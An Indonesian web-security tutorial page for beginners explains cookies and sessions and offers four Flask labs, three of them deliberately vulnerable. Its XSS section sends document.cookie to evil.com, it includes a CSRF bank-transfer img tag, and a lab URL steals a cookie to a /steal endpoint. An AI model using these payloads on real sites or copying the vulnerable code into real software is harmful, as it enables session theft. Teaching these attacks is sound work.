@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Belajar Session & Cookie - Pemula</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #f5f7fa;
+    color: #2d3748;
+    line-height: 1.7;
+  }
+
+  /* ===== LAYOUT ===== */
+  .layout {
+    display: flex;
+    min-height: 100vh;
+  }
+
+  /* ===== SIDEBAR ===== */
+  .sidebar {
+    width: 280px;
+    background: #1a202c;
+    color: #e2e8f0;
+    position: fixed;
+    top: 0;
+    left: 0;
+    height: 100vh;
+    overflow-y: auto;
+    padding: 24px 0;
+    transition: transform 0.3s;
+    z-index: 100;
+  }
+
+  .sidebar h2 {
+    color: #fff;
+    font-size: 1.1rem;
+    padding: 0 24px 16px;
+    border-bottom: 1px solid #2d3748;
+    margin-bottom: 16px;
+  }
+
+  .sidebar h2 span { color: #4299e1; }
+
+  .sidebar nav a {
+    display: block;
+    padding: 10px 24px;
+    color: #a0aec0;
+    text-decoration: none;
+    font-size: 0.9rem;
+    border-left: 3px solid transparent;
+    transition: all 0.2s;
+  }
+
+  .sidebar nav a:hover {
+    background: #2d3748;
+    color: #fff;
+    border-left-color: #4299e1;
+  }
+
+  .sidebar nav a.active {
+    background: #2d3748;
+    color: #fff;
+    border-left-color: #4299e1;
+  }
+
+  .sidebar nav .section-title {
+    padding: 16px 24px 8px;
+    font-size: 0.75rem;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    color: #4a5568;
+    font-weight: 700;
+  }
+
+  /* ===== CONTENT ===== */
+  .content {
+    margin-left: 280px;
+    flex: 1;
+    padding: 48px 64px;
+    max-width: 1000px;
+  }
+
+  .content h1 {
+    font-size: 2.2rem;
+    color: #1a202c;
+    margin-bottom: 16px;
+    border-bottom: 3px solid #4299e1;
+    padding-bottom: 12px;
+  }
+
+  .content h2 {
+    font-size: 1.6rem;
+    color: #1a202c;
+    margin: 40px 0 16px;
+    padding-top: 8px;
+  }
+
+  .content h3 {
+    font-size: 1.2rem;
+    color: #2d3748;
+    margin: 24px 0 12px;
+  }
+
+  .content p { margin-bottom: 14px; }
+
+  .content ul, .content ol {
+    margin: 12px 0 16px 24px;
+  }
+
+  .content li { margin-bottom: 6px; }
+
+  .content code {
+    background: #edf2f7;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: "Fira Code", Consolas, monospace;
+    font-size: 0.88em;
+    color: #d53f8c;
+  }
+
+  .content pre {
+    background: #1a202c;
+    color: #e2e8f0;
+    padding: 16px 20px;
+    border-radius: 8px;
+    overflow-x: auto;
+    margin: 16px 0;
+    font-size: 0.88rem;
+    line-height: 1.6;
+  }
+
+  .content pre code {
+    background: none;
+    color: inherit;
+    padding: 0;
+  }
+
+  /* ===== CALLOUTS ===== */
+  .callout {
+    padding: 16px 20px;
+    border-radius: 8px;
+    margin: 20px 0;
+    border-left: 4px solid;
+  }
+
+  .callout-info {
+    background: #ebf8ff;
+    border-color: #4299e1;
+    color: #2c5282;
+  }
+
+  .callout-warn {
+    background: #fffaf0;
+    border-color: #ed8936;
+    color: #7b341e;
+  }
+
+  .callout-danger {
+    background: #fff5f5;
+    border-color: #e53e3e;
+    color: #742a2a;
+  }
+
+  .callout-success {
+    background: #f0fff4;
+    border-color: #48bb78;
+    color: #22543d;
+  }
+
+  .callout strong { display: block; margin-bottom: 4px; }
+
+  /* ===== TABLES ===== */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0;
+    background: #fff;
+    border-radius: 8px;
+    overflow: hidden;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+  }
+
+  th, td {
+    padding: 12px 16px;
+    text-align: left;
+    border-bottom: 1px solid #e2e8f0;
+    font-size: 0.92rem;
+  }
+
+  th {
+    background: #4299e1;
+    color: #fff;
+    font-weight: 600;
+  }
+
+  tr:last-child td { border-bottom: none; }
+  tr:nth-child(even) { background: #f7fafc; }
+
+  /* ===== BADGES ===== */
+  .badge {
+    display: inline-block;
+    padding: 3px 10px;
+    border-radius: 12px;
+    font-size: 0.75rem;
+    font-weight: 600;
+    text-transform: uppercase;
+  }
+
+  .badge-danger { background: #fed7d7; color: #742a2a; }
+  .badge-safe { background: #c6f6d5; color: #22543d; }
+
+  /* ===== LAB BOX ===== */
+  .lab {
+    background: #fff;
+    border: 2px solid #4299e1;
+    border-radius: 12px;
+    padding: 24px;
+    margin: 24px 0;
+    box-shadow: 0 4px 12px rgba(66,153,225,0.1);
+  }
+
+  .lab-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 16px;
+    padding-bottom: 12px;
+    border-bottom: 2px dashed #e2e8f0;
+  }
+
+  .lab-number {
+    background: #4299e1;
+    color: #fff;
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 700;
+    font-size: 1.1rem;
+    flex-shrink: 0;
+  }
+
+  .lab-title { font-size: 1.15rem; font-weight: 700; color: #1a202c; }
+
+  .task-list {
+    background: #f7fafc;
+    padding: 16px 20px 16px 40px;
+    border-radius: 8px;
+    margin-top: 12px;
+  }
+
+  .task-list li { margin-bottom: 8px; }
+
+  /* ===== MOBILE ===== */
+  .menu-toggle {
+    display: none;
+    position: fixed;
+    top: 16px;
+    left: 16px;
+    z-index: 200;
+    background: #1a202c;
+    color: #fff;
+    border: none;
+    padding: 10px 14px;
+    border-radius: 8px;
+    font-size: 1.2rem;
+    cursor: pointer;
+  }
+
+  @media (max-width: 900px) {
+    .sidebar { transform: translateX(-100%); }
+    .sidebar.open { transform: translateX(0); }
+    .content { margin-left: 0; padding: 80px 24px 40px; }
+    .menu-toggle { display: block; }
+    .content h1 { font-size: 1.7rem; }
+    .content h2 { font-size: 1.3rem; }
+  }
+
+  /* Scrollbar sidebar */
+  .sidebar::-webkit-scrollbar { width: 6px; }
+  .sidebar::-webkit-scrollbar-thumb { background: #4a5568; border-radius: 3px; }
+
+  /* Smooth scroll */
+  html { scroll-behavior: smooth; }
+</style>
+</head>
+<body>
+
+<button class="menu-toggle" onclick="document.querySelector('.sidebar').classList.toggle('open')">☰</button>
+
+<div class="layout">
+
+  <!-- ===== SIDEBAR ===== -->
+  <aside class="sidebar">
+    <h2>🍪 <span>Session</span> & Cookie</h2>
+    <nav>
+      <div class="section-title">Dasar</div>
+      <a href="#pengantar">Pengantar</a>
+      <a href="#cookie">Apa itu Cookie?</a>
+      <a href="#session">Apa itu Session?</a>
+      <a href="#perbandingan">Cookie vs Session</a>
+
+      <div class="section-title">Keamanan</div>
+      <a href="#kerentanan">Kerentanan Umum</a>
+      <a href="#hijacking">Session Hijacking</a>
+      <a href="#fixation">Session Fixation</a>
+      <a href="#xss">XSS</a>
+      <a href="#csrf">CSRF</a>
+
+      <div class="section-title">Praktikum</div>
+      <a href="#persiapan">Persiapan</a>
+      <a href="#lab1">Lab 1: Cookie Rentan</a>
+      <a href="#lab2">Lab 2: Weak Session ID</a>
+      <a href="#lab3">Lab 3: Session Aman</a>
+      <a href="#lab4">Lab 4: XSS Attack</a>
+
+      <div class="section-title">Penutup</div>
+      <a href="#best-practice">Best Practice</a>
+      <a href="#evaluasi">Evaluasi</a>
+      <a href="#referensi">Referensi</a>
+    </nav>
+  </aside>
+
+  <!-- ===== CONTENT ===== -->
+  <main class="content">
+
+    <h1>📚 Belajar Session & Cookie untuk Pemula</h1>
+    <p>Panduan lengkap memahami <strong>Cookie</strong>, <strong>Session</strong>, kerentanannya, dan praktikum langsung dengan Flask.</p>
+
+    <!-- PENGANTAR -->
+    <section id="pengantar">
+      <h2>1. Pengantar</h2>
+      <p>HTTP adalah <strong>stateless protocol</strong> — artinya server tidak "ingat" siapa kamu di request sebelumnya. Bayangkan kamu login ke sebuah website, lalu pindah ke halaman lain, tiba-tiba diminta login lagi. Sangat menyebalkan, kan?</p>
+      <p>Di sinilah <strong>Cookie</strong> dan <strong>Session</strong> berperan: keduanya menyimpan "ingatan" tentang siapa kamu di antara request.</p>
+    </section>
+
+    <!-- COOKIE -->
+    <section id="cookie">
+      <h2>2. Apa itu Cookie?</h2>
+      <p><strong>Cookie</strong> adalah potongan kecil data (biasanya &lt; 4KB) yang dikirim server ke browser, lalu browser menyimpannya dan mengirimkannya kembali ke server pada setiap request berikutnya ke domain yang sama.</p>
+
+      <h3>Cara Kerja Sederhana</h3>
+      <pre><code>1. Browser → Server : GET /login
+2. Server → Browser : HTTP/1.1 200 OK
+                      Set-Cookie: user=andi; Path=/
+3. Browser menyimpan cookie "user=andi"
+4. Browser → Server : GET /dashboard
+                      Cookie: user=andi</code></pre>
+
+      <h3>Atribut Penting Cookie</h3>
+      <table>
+        <thead>
+          <tr><th>Atribut</th><th>Fungsi</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><code>Name=Value</code></td><td>Data utama cookie</td></tr>
+          <tr><td><code>Domain</code></td><td>Domain mana yang boleh menerima cookie</td></tr>
+          <tr><td><code>Path</code></td><td>URL path yang boleh mengakses cookie</td></tr>
+          <tr><td><code>Expires / Max-Age</code></td><td>Kapan cookie kadaluarsa</td></tr>
+          <tr><td><code>Secure</code></td><td>Hanya dikirim via HTTPS</td></tr>
+          <tr><td><code>HttpOnly</code></td><td><strong>Tidak bisa diakses JavaScript</strong> (anti XSS)</td></tr>
+          <tr><td><code>SameSite</code></td><td><code>Strict</code> / <code>Lax</code> / <code>None</code> (anti CSRF)</td></tr>
+        </tbody>
+      </table>
+
+      <div class="callout callout-success">
+        <strong>✅ Contoh Set-Cookie yang Aman</strong>
+        <pre><code>Set-Cookie: session_id=abc123; 
+            Path=/; 
+            Secure; 
+            HttpOnly; 
+            SameSite=Strict; 
+            Max-Age=3600</code></pre>
+      </div>
+    </section>
+
+    <!-- SESSION -->
+    <section id="session">
+      <h2>3. Apa itu Session?</h2>
+      <p><strong>Session</strong> adalah data yang disimpan <strong>di sisi server</strong> untuk mengidentifikasi user selama periode tertentu. Server hanya mengirim <strong>session ID</strong> ke browser (biasanya via cookie), sedangkan data sebenarnya (username, role, dll) tetap di server.</p>
+
+      <h3>Alur Session</h3>
+      <pre><code>1. User login → Server buat session_id = "xyz789"
+2. Server simpan: xyz789 → {user: "andi", role: "admin"}
+3. Server kirim cookie: session_id=xyz789
+4. Request berikutnya: Browser kirim session_id=xyz789
+5. Server cek session storage → dapat data user</code></pre>
+    </section>
+
+    <!-- PERBANDINGAN -->
+    <section id="perbandingan">
+      <h2>4. Perbandingan Cookie vs Session</h2>
+      <table>
+        <thead>
+          <tr><th>Aspek</th><th>Cookie</th><th>Session</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Lokasi data</td><td>Browser (client)</td><td>Server</td></tr>
+          <tr><td>Keamanan</td><td>Kurang aman (bisa diedit user)</td><td>Lebih aman</td></tr>
+          <tr><td>Beban server</td><td>Ringan</td><td>Lebih berat</td></tr>
+          <tr><td>Kapasitas</td><td>~4KB</td><td>Tak terbatas</td></tr>
+          <tr><td>Contoh data</td><td>Preferensi tema, bahasa</td><td>Login state, cart</td></tr>
+        </tbody>
+      </table>
+    </section>
+
+    <!-- KERENTANAN -->
+    <section id="kerentanan">
+      <h2>5. ⚠️ Kerentanan Umum</h2>
+
+      <h3 id="hijacking">5.1 Session Hijacking <span class="badge badge-danger">Tinggi</span></h3>
+      <p>Penyerang mencuri <code>session_id</code> korban, lalu menggunakannya untuk mengakses akun korban.</p>
+      <p><strong>Penyebab:</strong> cookie tanpa <code>HttpOnly</code>, XSS, sniffing di HTTP.</p>
+
+      <h3 id="fixation">5.2 Session Fixation <span class="badge badge-danger">Tinggi</span></h3>
+      <p>Penyerang memaksa korban menggunakan <code>session_id</code> yang sudah diketahui penyerang.</p>
+      <p><strong>Skenario:</strong> korban login dengan session_id <code>attacker123</code>, penyerang tinggal pakai ID itu.</p>
+
+      <h3 id="xss">5.3 XSS (Cross-Site Scripting) <span class="badge badge-danger">Kritis</span></h3>
+      <p>Script jahat menyisipkan <code>document.cookie</code> dan mengirim ke server penyerang.</p>
+      <pre><code>&lt;script&gt;fetch('http://evil.com?c='+document.cookie)&lt;/script&gt;</code></pre>
+      <p><strong>Mitigasi:</strong> <code>HttpOnly</code>, validasi output, CSP.</p>
+
+      <h3 id="csrf">5.4 CSRF (Cross-Site Request Forgery) <span class="badge badge-danger">Tinggi</span></h3>
+      <p>Penyerang membuat korban tanpa sadar mengirim request yang sudah terautentikasi.</p>
+      <pre><code>&lt;img src="http://bank.com/transfer?to=attacker&amp;amount=1000"&gt;</code></pre>
+      <p><strong>Mitigasi:</strong> CSRF token, <code>SameSite</code> cookie.</p>
+
+      <h3>5.5 Cookie Tossing</h3>
+      <p>Penyerang men-set cookie dengan path/domain berbeda untuk menimpa cookie korban.</p>
+
+      <h3>5.6 Predictable Session ID</h3>
+      <p>Jika ID dibuat dengan pola mudah ditebak (misal increment), penyerang bisa brute-force.</p>
+
+      <h3>5.7 Session Tidak Di-invalidate</h3>
+      <p>Session lama yang tidak dihapus setelah logout bisa disalahgunakan.</p>
+    </section>
+
+    <!-- PERSIAPAN -->
+    <section id="persiapan">
+      <h2>6. 🧪 Persiapan Praktikum</h2>
+      <p>Kita akan membuat aplikasi <strong>Flask</strong> untuk mendemonstrasikan berbagai skenario keamanan session & cookie.</p>
+
+      <pre><code>mkdir lab-session &amp;&amp; cd lab-session
+python -m venv .venv
+source .venv/bin/activate   # Windows: .venv\Scripts\activate
+pip install flask</code></pre>
+
+      <div class="callout callout-info">
+        <strong>💡 Catatan</strong>
+        Jika muncul error <code>ModuleNotFoundError: No module named 'flask'</code>, pastikan virtual environment sudah aktif dan jalankan <code>python -m pip install flask</code>.
+      </div>
+    </section>
+
+    <!-- LAB 1 -->
+    <section id="lab1">
+      <h2>7. Lab Praktikum</h2>
+
+      <div class="lab">
+        <div class="lab-header">
+          <div class="lab-number">1</div>
+          <div class="lab-title">Cookie Rentan (Vulnerable Cookie)</div>
+        </div>
+
+        <pre><code>from flask import Flask, request, make_response
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    user = request.cookies.get('user', 'Guest')
+    return f'''
+        &lt;h1&gt;Halo, {user}!&lt;/h1&gt;
+        &lt;a href="/set?user=andi"&gt;Login sebagai Andi&lt;/a&gt;&lt;br&gt;
+        &lt;a href="/logout"&gt;Logout&lt;/a&gt;
+        &lt;hr&gt;
+        &lt;p&gt;Buka DevTools → Console, ketik: &lt;code&gt;document.cookie&lt;/code&gt;&lt;/p&gt;
+    '''
+
+@app.route('/set')
+def set_cookie():
+    user = request.args.get('user', 'Guest')
+    resp = make_response(f'&lt;h2&gt;Cookie diset untuk: {user}&lt;/h2&gt;&lt;a href="/"&gt;Kembali&lt;/a&gt;')
+    # ❌ RENTAN: tanpa HttpOnly, tanpa Secure, tanpa SameSite
+    resp.set_cookie('user', user)
+    return resp
+
+@app.route('/logout')
+def logout():
+    resp = make_response('&lt;h2&gt;Logout&lt;/h2&gt;&lt;a href="/"&gt;Kembali&lt;/a&gt;')
+    resp.delete_cookie('user')
+    return resp
+
+if __name__ == '__main__':
+    app.run(debug=True, port=5000)</code></pre>
+
+        <div class="task-list">
+          <strong>🎯 Tugas:</strong>
+          <ol>
+            <li>Jalankan: <code>python main.py</code></li>
+            <li>Buka <code>http://localhost:5000</code>, klik Login sebagai Andi</li>
+            <li>Buka DevTools → Console → ketik <code>document.cookie</code></li>
+            <li><strong>Eksploitasi:</strong> jalankan <code>document.cookie = "user=admin"</code>, refresh halaman → Anda jadi "admin"! 🚨</li>
+            <li><strong>Diskusi:</strong> Kenapa ini berbahaya? Bagaimana mencegahnya?</li>
+          </ol>
+        </div>
+      </div>
+    </section>
+
+    <!-- LAB 2 -->
+    <section id="lab2">
+      <div class="lab">
+        <div class="lab-header">
+          <div class="lab-number">2</div>
+          <div class="lab-title">Session Predictable ID (Rentan)</div>
+        </div>
+
+        <pre><code>from flask import Flask, request, redirect, session
+
+app = Flask(__name__)
+app.secret_key = 'secret'
+
+counter = 1000  # ❌ predictable!
+
+@app.route('/')
+def index():
+    if 'user' in session:
+        return f'''
+            &lt;h1&gt;Dashboard - {session['user']}&lt;/h1&gt;
+            &lt;p&gt;Session ID: {session.get('sid')}&lt;/p&gt;
+            &lt;a href="/logout"&gt;Logout&lt;/a&gt;
+        '''
+    return '&lt;a href="/login"&gt;Login&lt;/a&gt;'
+
+@app.route('/login')
+def login():
+    global counter
+    counter += 1
+    session['sid'] = counter  # ❌ increment = mudah ditebak
+    session['user'] = 'andi'
+    return redirect('/')
+
+@app.route('/logout')
+def logout():
+    session.clear()
+    return redirect('/')
+
+if __name__ == '__main__':
+    app.run(debug=True, port=5001)</code></pre>
+
+        <div class="task-list">
+          <strong>🎯 Tugas:</strong>
+          <ol>
+            <li>Jalankan aplikasi, login, catat <code>sid</code> (misal: 1001)</li>
+            <li>Logout, login lagi → <code>sid</code> jadi 1002, dst.</li>
+            <li><strong>Eksploitasi:</strong> karena ID sequential, penyerang bisa menebak session user lain</li>
+            <li><strong>Diskusi:</strong> Bagaimana session ID yang aman dibuat?</li>
+          </ol>
+        </div>
+      </div>
+    </section>
+
+    <!-- LAB 3 -->
+    <section id="lab3">
+      <div class="lab">
+        <div class="lab-header">
+          <div class="lab-number">3</div>
+          <div class="lab-title">Session Aman (Best Practice)</div>
+        </div>
+
+        <pre><code>from flask import Flask, redirect, session, make_response
+import secrets
+
+app = Flask(__name__)
+app.secret_key = secrets.token_hex(32)
+
+app.config.update(
+    SESSION_COOKIE_HTTPONLY=True,
+    SESSION_COOKIE_SAMESITE='Lax',
+    SESSION_COOKIE_SECURE=False,
+    PERMANENT_SESSION_LIFETIME=1800,
+)
+
+@app.route('/')
+def index():
+    if 'user' in session:
+        return f'''
+            &lt;h1&gt;Dashboard Aman - {session['user']}&lt;/h1&gt;
+            &lt;p&gt;Session ID: {session.get('sid')}&lt;/p&gt;
+            &lt;a href="/logout"&gt;Logout&lt;/a&gt;
+            &lt;hr&gt;
+            &lt;p&gt;Coba ketik di Console: &lt;code&gt;document.cookie&lt;/code&gt;&lt;/p&gt;
+        '''
+    return '&lt;a href="/login"&gt;Login&lt;/a&gt;'
+
+@app.route('/login')
+def login():
+    session['sid'] = secrets.token_urlsafe(32)  # ✅ random aman
+    session['user'] = 'andi'
+    session.permanent = True
+    return redirect('/')
+
+@app.route('/logout')
+def logout():
+    session.clear()
+    resp = make_response('&lt;h2&gt;Logout berhasil.&lt;/h2&gt;&lt;a href="/"&gt;Kembali&lt;/a&gt;')
+    return resp
+
+if __name__ == '__main__':
+    app.run(debug=True, port=5002)</code></pre>
+
+        <div class="task-list">
+          <strong>🎯 Tugas:</strong>
+          <ol>
+            <li>Jalankan aplikasi, login</li>
+            <li>Buka Console → <code>document.cookie</code> → Anda <strong>tidak bisa</strong> melihat session (karena <code>HttpOnly</code>)</li>
+            <li>Perhatikan session ID berupa string random panjang</li>
+            <li><strong>Bandingkan</strong> dengan Lab 1 &amp; 2 — apa yang berubah?</li>
+          </ol>
+        </div>
+      </div>
+    </section>
+
+    <!-- LAB 4 -->
+    <section id="lab4">
+      <div class="lab">
+        <div class="lab-header">
+          <div class="lab-number">4</div>
+          <div class="lab-title">Simulasi Serangan XSS → Session Theft</div>
+        </div>
+
+        <pre><code>from flask import Flask, request, make_response
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    name = request.args.get('name', '')  # ❌ tidak disanitasi
+    return f'''
+        &lt;h1&gt;Halo, {name}&lt;/h1&gt;
+        &lt;form&gt;
+            &lt;input name="name" placeholder="Nama Anda"&gt;
+            &lt;button&gt;Kirim&lt;/button&gt;
+        &lt;/form&gt;
+        &lt;p&gt;Login status: {request.cookies.get('session_id', 'Belum login')}&lt;/p&gt;
+    '''
+
+@app.route('/setlogin')
+def setlogin():
+    resp = make_response('&lt;h2&gt;Login! &lt;a href="/"&gt;Kembali&lt;/a&gt;&lt;/h2&gt;')
+    resp.set_cookie('session_id', 'SECRET_SESSION_12345')  # ❌ tanpa HttpOnly
+    return resp
+
+@app.route('/steal')
+def steal():
+    stolen = request.args.get('c', '')
+    print(f"\n🚨 [ATTACKER] Cookie dicuri: {stolen}\n")
+    return '&lt;img src="data:image/gif;base64,R0lGODlhAQABAAAAACw="&gt;'
+
+if __name__ == '__main__':
+    app.run(debug=True, port=5003)</code></pre>
+
+        <div class="task-list">
+          <strong>🎯 Tugas:</strong>
+          <ol>
+            <li>Jalankan, kunjungi <code>/setlogin</code> untuk set cookie</li>
+            <li>Kunjungi URL XSS:
+              <pre><code>http://localhost:5003/?name=&lt;script&gt;fetch('http://localhost:5003/steal?c='+document.cookie)&lt;/script&gt;</code></pre>
+            </li>
+            <li><strong>Lihat terminal server</strong> → cookie "dicuri" dan di-print 🚨</li>
+            <li><strong>Diskusi:</strong> bagaimana mencegahnya? (sanitasi input, HttpOnly, CSP)</li>
+          </ol>
+        </div>
+      </div>
+    </section>
+
+    <!-- BEST PRACTICE -->
+    <section id="best-practice">
+      <h2>8. 📋 Ringkasan Best Practice</h2>
+
+      <div class="callout callout-success">
+        <strong>✅ DO</strong>
+        <ul>
+          <li>Gunakan <strong>HttpOnly + Secure + SameSite</strong> pada cookie session</li>
+          <li>Generate session ID dengan CSPRNG (<code>secrets.token_urlsafe(32)</code>)</li>
+          <li>Regenerate session ID setelah login (anti session fixation)</li>
+          <li>Invalidate session saat logout</li>
+          <li>Set timeout session (idle &amp; absolute)</li>
+          <li>Simpan session di server-side store (Redis, DB) untuk produksi</li>
+          <li>Gunakan CSRF token untuk form penting</li>
+        </ul>
+      </div>
+
+      <div class="callout callout-danger">
+        <strong>❌ DON'T</strong>
+        <ul>
+          <li>Jangan simpan data sensitif di cookie (password, role)</li>
+          <li>Jangan pakai session ID yang predictable</li>
+          <li>Jangan lupa menutup session lama setelah logout</li>
+          <li>Jangan akses <code>document.cookie</code> untuk data autentikasi</li>
+          <li>Jangan set cookie tanpa atribut keamanan</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- EVALUASI -->
+    <section id="evaluasi">
+      <h2>9. 🎓 Evaluasi</h2>
+      <p>Setelah menyelesaikan 4 lab, jawab pertanyaan berikut:</p>
+      <ol>
+        <li>Apa perbedaan mendasar antara cookie dan session?</li>
+        <li>Jelaskan mengapa <code>HttpOnly</code> penting dan kapan atribut ini bekerja.</li>
+        <li>Bagaimana session fixation terjadi? Bagaimana mencegahnya?</li>
+        <li>Pada Lab 1, mengapa kita bisa menjadi "admin" hanya dengan mengubah cookie?</li>
+        <li>Tuliskan 3 mitigasi utama untuk serangan XSS yang mencuri cookie.</li>
+        <li>Bandingkan session ID pada Lab 2 dan Lab 3 — mana lebih aman dan mengapa?</li>
+      </ol>
+    </section>
+
+    <!-- REFERENSI -->
+    <section id="referensi">
+      <h2>10. 🔗 Referensi Lanjutan</h2>
+      <ul>
+        <li><strong>OWASP Session Management Cheat Sheet</strong> — owasp.org</li>
+        <li><strong>OWASP Top 10</strong> — A01 Broken Access Control, A03 Injection, A07 Auth Failures</li>
+        <li><strong>MDN Web Docs</strong> — HTTP Cookies</li>
+        <li><strong>PortSwigger Web Security Academy</strong> — Lab gratis untuk XSS, CSRF, session</li>
+      </ul>
+
+      <div class="callout callout-info">
+        <strong>💡 Tips Belajar</strong>
+        Setelah paham konsepnya, coba install <strong>DVWA (Damn Vulnerable Web Application)</strong> atau <strong>OWASP Juice Shop</strong> untuk praktik lebih lanjut dengan skenario dunia nyata.
+      </div>
+
+      <p style="margin-top: 40px; text-align: center; color: #718096; font-size: 0.9rem;">
+        Selamat belajar! 🚀 Jangan lupa praktik langsung — teori tanpa praktik hanya jadi hafalan.
+      </p>
+    </section>
+
+  </main>
+</div>
+
+<script>
+  // Highlight sidebar link aktif berdasarkan posisi scroll
+  const sections = document.querySelectorAll('section[id]');
+  const navLinks = document.querySelectorAll('.sidebar nav a');
+
+  window.addEventListener('scroll', () => {
+    let current = '';
+    sections.forEach(section => {
+      const sectionTop = section.offsetTop - 100;
+      if (window.scrollY >= sectionTop) current = section.getAttribute('id');
+    });
+
+    navLinks.forEach(link => {
+      link.classList.remove('active');
+      if (link.getAttribute('href') === '#' + current) {
+        link.classList.add('active');
+      }
+    });
+  });
+
+  // Tutup sidebar saat link diklik di mobile
+  navLinks.forEach(link => {
+    link.addEventListener('click', () => {
+      if (window.innerWidth <= 900) {
+        document.querySelector('.sidebar').classList.remove('open');
+      }
+    });
+  });
+</script>
+
+</body>
+</html>
